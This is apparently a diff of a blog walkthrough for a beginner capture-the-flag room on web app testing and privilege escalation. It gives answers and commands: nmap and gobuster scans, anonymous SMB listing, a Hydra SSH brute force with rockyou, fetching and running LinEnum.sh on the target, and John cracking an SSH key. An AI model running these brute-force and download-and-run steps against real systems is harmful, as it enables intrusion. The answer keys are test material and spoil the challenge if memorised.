@@ -14,9 +14,9 @@ Web App Testing and Privilege Escalation
 
 In these set of tasks you'll learn the following:
 
-* brute forcing 
+* brute forcing
     
-* hash cracking 
+* hash cracking
     
 * service enumeration
     
@@ -33,16 +33,19 @@ Credits to [Josiah Pierce](https://www.vulnhub.com/author/josiah-pierce,569/) fr
     
 2. Find the services exposed by the machine
     
-3. What is the name of the hidden directory on the web server(enter name without /)? `development`  
+3. What is the name of the hidden directory on the web server(enter name without /)? `development`
+    
       
-    `nmap -sV -p 1-65000 <IP_Address>`
+    `nmap -sV -p 1-65000 <IP_Address>`  
+      
+    `gobuster dir -u <IP_Address> -w /usr/share/wordlists/dirb/common.txt`  
     
     ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750081471175/9b493d68-7924-47af-a309-93895d596b9a.png align="center")
     
 4. User brute-forcing to find the username & password
     
 5. What is the username? `jan`  
-    `smbclient -L \\\\<IP_Address>\\ -N`  
+    `smbclient -L \\\\<IP_Address>\\ -N`
     
     `smbclient -L \\\\10.10.11.217\\Anonymous -N` this launches the smb client
     
@@ -57,40 +60,39 @@ Credits to [Josiah Pierce](https://www.vulnhub.com/author/josiah-pierce,569/) fr
     
     ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750106196450/cd4ee182-05a5-47a6-8a78-8dc5bc0235de.png align="center")
     
-6. What is the password? `armando`  
-      
-    There are a lot of Hydra commands, but the one that worked for this case was the one that uses SSH  
-      
+6. What is the password? `armando`
+    
+    There are a lot of Hydra commands, but the one that worked for this case was the one that uses SSH
+    
     `hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.143.82`
     
     ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750106345251/bf8425e3-29bb-422f-9e5d-564ea36754de.png align="center")
     
 7. What service do you use to access the server(answer in abbreviation in all caps)? `SSH`
     
-8. Enumerate the machine to find any vectors for privilege escalation  
-      
-    On one tab, start the server at port 8000: `python3 -m http.server 8000`  
-      
-    on another run the following commands:  
-      
-    `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`  
+8. Enumerate the machine to find any vectors for privilege escalation
     
-    `wget http://10.10.144.83:8000/LinEnum.sh`  
+    On one tab, start the server at port 8000: `python3 -m http.server 8000`
     
-    `chmod +x LinEnum.sh`  
+    on another run the following commands:
+    
+    `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`
+    
+    `wget http://10.10.144.83:8000/LinEnum.sh`
+    
+    `chmod +x LinEnum.sh`
     
     ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750106849029/e616a8b0-1a0b-4161-bfc4-3d202ac7013a.png align="center")
     
-    `./LinEnum.sh`  
+    `./LinEnum.sh`
     
 9. What is the name of the other user you found(al[l](http://10.10.144.83:8000/LinEnum.sh) lowercase)? `kay`
     
-10. If you have found another user, what can you do with this information?  
-      
-    For this last part, you’ll be using John and SSH2John.py to find the id\_rsa and later on the password  
+10. If you have found another user, what can you do with this information?
     
-11. What is the final password you obtain? `heresareallystrongpasswordthatfollowsthepasswordpolicy$$`  
-      
+    For this last part, you’ll be using John and SSH2John.py to find the id\_rsa and later on the password
+    
+11. What is the final password you obtain? `heresareallystrongpasswordthatfollowsthepasswordpolicy$$`
     
 
 Thank you for reading my article. Please leave any questions or comments on improving my learning journey and the THM challenges.
